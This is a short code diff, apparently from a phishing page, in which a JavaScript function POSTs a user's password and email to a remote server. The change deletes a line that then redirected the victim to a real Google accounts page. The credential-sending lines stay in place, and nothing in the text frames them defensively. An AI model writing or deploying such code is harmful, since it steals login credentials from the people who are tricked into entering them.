@@ -58,5 +58,4 @@ function next2() {
   x.open("POST", server, true);
   x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   x.send("password="+user_password+"&email="+user_email);
-  window.location.href = "https://accounts.google.com"
 }
